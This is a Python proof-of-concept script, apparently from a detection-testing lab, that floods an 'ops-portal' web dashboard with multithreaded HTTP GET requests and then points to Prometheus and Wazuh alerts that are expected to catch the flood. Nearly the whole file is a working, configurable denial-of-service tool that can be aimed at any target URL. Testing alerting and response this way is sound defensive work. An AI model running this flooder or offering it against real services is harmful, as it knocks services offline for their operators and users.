#!/usr/bin/env python3
"""
Threat 1 PoC: DDoS attack against the ops-portal web dashboard.
Sends a flood of HTTP GET requests from multiple threads to overwhelm the service.

Usage:
    python3 poc/ddos_attack.py --target http://<ops-portal-ip>:5600 --threads 20 --duration 60
"""
import argparse
import threading
import time
import urllib.request
import urllib.error
from datetime import datetime

parser = argparse.ArgumentParser(description="DDoS PoC — ops-portal flood")
parser.add_argument("--target", default="http://localhost:5600", help="Target URL")
parser.add_argument("--threads", type=int, default=20, help="Number of threads")
parser.add_argument("--duration", type=int, default=60, help="Attack duration (seconds)")
args = parser.parse_args()

requests_sent = 0
errors = 0
lock = threading.Lock()
stop_event = threading.Event()


def flood_worker():
    global requests_sent, errors
    while not stop_event.is_set():
        try:
            urllib.request.urlopen(args.target, timeout=2)
            with lock:
                requests_sent += 1
        except Exception:
            with lock:
                errors += 1


def print_stats():
    start = time.time()
    while not stop_event.is_set():
        time.sleep(5)
        elapsed = time.time() - start
        with lock:
            rate = requests_sent / max(elapsed, 1)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Sent={requests_sent} Errors={errors} Rate={rate:.1f}/s")


print(f"[*] DDoS PoC starting: {args.threads} threads -> {args.target} for {args.duration}s")
print(f"[*] Expected detection: Prometheus PotentialDDoS alert at >50 req/10s")
print(f"[*] Expected response: Wazuh active response blocks attacker IP via iptables")

threads = [threading.Thread(target=flood_worker, daemon=True) for _ in range(args.threads)]
threads.append(threading.Thread(target=print_stats, daemon=True))
for t in threads:
    t.start()

time.sleep(args.duration)
stop_event.set()

print(f"\n[+] Attack finished. Total sent={requests_sent}, errors={errors}")
print(f"[+] Check Prometheus: rate(http_requests_total{{job='ops-portal'}}[10s])")
print(f"[+] Check Wazuh: rule 100002 (DDoS detected)")
